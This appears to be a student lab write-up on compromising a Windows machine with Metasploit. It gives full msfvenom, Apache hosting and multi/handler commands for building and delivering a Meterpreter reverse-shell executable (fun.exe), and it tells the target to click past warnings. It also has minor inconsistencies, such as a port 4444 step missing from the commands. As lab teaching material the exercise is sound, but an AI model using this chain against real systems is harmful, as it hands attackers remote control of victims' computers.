# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:
<img width="675" height="347" alt="Screenshot 2026-05-19 192459" src="https://github.com/user-attachments/assets/656b2113-4146-443a-9f1a-79632dac9a3a" />

Explanation:
The ifconfig command is used to display the network configuration details of the Kali Linux machine. It shows information such as IP address, network interface name, MAC address, and packet statistics. In this experiment, this command is used to identify the attacker machine’s IP address so that the target machine knows where to establish the reverse connection. The IP address obtained from this command is later used in payload generation and Metasploit listener configuration.



Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT
![Screenshot 2024-04-28 123609](https://github.com/R-Udayakumar/Compromising-windows-using-Metasploit/assets/118708024/2e10d3b3-4532-481d-89ff-12681cf20564)

Explanation:
This command is used to generate a Windows executable payload using the Metasploit Framework. msfvenom is a payload generation tool used for creating malicious or test payloads for security experimentation in controlled environments. The -p option specifies the payload type. Here, windows/meterpreter/reverse_tcp means a Windows Meterpreter payload that creates a reverse TCP connection back to the attacker machine. LHOST=192.168.1.2 specifies the attacker's IP address where the connection should return. -f exe tells the tool to generate the payload in executable (.exe) format suitable for Windows systems. The symbol > redirects the generated payload output into a file named fun.exe.


copy the fun.exe into the apache /var/www/html folder

<img width="425" height="70" alt="Screenshot 2026-05-19 193056" src="https://github.com/user-attachments/assets/a1a2f2ec-e424-4cfe-b490-eec4ee61f3c6" />



The cp command is used to copy files from one location to another in Linux. In this experiment, the generated payload file fun.exe is copied into /var/www/html, which is the default root directory of the Apache web server. Files placed in this directory become accessible through a web browser using HTTP. This allows the target machine to download the executable payload through a browser by entering the Kali machine’s IP address followed by the filename.
Start apache server
sudo systemctl apache2 start

<img width="349" height="49" alt="Screenshot 2026-05-19 193108" src="https://github.com/user-attachments/assets/4954b3af-7d7b-4d4e-b409-c45ee46dcc8c" />

This command starts the Apache web server service in Kali Linux. Apache is used here to host the payload file so it can be downloaded remotely. sudo provides administrator privileges required for managing system services. systemctl is the Linux utility used for controlling services. start instructs the system to begin the Apache service, and apache2 refers to the Apache web server. Once started, Apache begins serving files from its web directory.

Check the status of apache2
<img width="933" height="398" alt="Screenshot 2026-05-19 192930" src="https://github.com/user-attachments/assets/306eebee-720c-4e6c-b62c-ac46644c9180" />

Explanation:
This command checks the current status of the Apache web server. It confirms whether the service is running successfully or if there are errors. The output displays service state, process ID, uptime, and logs. If the server is working correctly, the output shows active (running). This verification is important because if Apache is not running, the payload file cannot be downloaded by the target machine.
<img width="927" height="528" alt="Screenshot 2026-05-19 193408" src="https://github.com/user-attachments/assets/00abac91-d17d-4f3e-9871-fb1f3e8e202e" />


Invoke msfconsole:



msfconsole launches the Metasploit Framework console, which is the main command-line interface for penetration testing operations. It provides access to exploits, payloads, scanners, auxiliary tools, and post-exploitation modules. In this experiment, it is used to configure a listener that waits for the target machine’s reverse connection after the payload is executed.
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
## OUTPUT:

This command selects the Metasploit multi-handler module. A handler is used to listen for incoming connections from payloads. The multi/handler module is generic, meaning it can handle many types of payloads instead of a single exploit. In this experiment, it waits for the Windows Meterpreter payload to connect back to the Kali machine.
This command tells Metasploit which payload type it should expect. windows specifies the target operating system, meterpreter specifies the advanced remote shell environment, and reverse_tcp indicates that the target machine initiates the TCP connection back to the attacker. This must match the payload used during msfvenom generation; otherwise, the connection will fail.
This command sets the local host IP address that Metasploit will listen on. It tells the payload where to connect after execution. The IP address entered here must be the Kali Linux machine’s reachable IP address. If an incorrect IP is provided, the reverse connection cannot be established.
This command specifies the listening port number used for communication between the payload and Metasploit. Port 4444 is commonly used in Metasploit experiments, though other ports can also be chosen. The port number must match the port expected by the payload for successful communication.
The exploit command starts the configured Metasploit handler and begins listening for incoming connections from the payload. Once executed, Metasploit waits for the target machine to run the payload and establish the reverse TCP connection. If successful, a Meterpreter session is opened.

<img width="691" height="175" alt="image" src="https://github.com/user-attachments/assets/28bc64bb-ace8-458c-80b6-fc77b6cc38cc" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 


<img width="810" height="192" alt="image" src="https://github.com/user-attachments/assets/5961110a-db5a-4158-b085-8ca92ef1f92b" />


This is the URL entered in the target Windows machine’s browser to download the payload executable. Since the file is hosted in Apache’s web directory, it becomes accessible over HTTP. The target downloads the file and executes it, causing the reverse connection to be initiated.

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

<img width="955" height="93" alt="Screenshot 2026-05-20 073133" src="https://github.com/user-attachments/assets/8eb85251-c88a-4362-a437-4cd1e4588e2f" />








## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
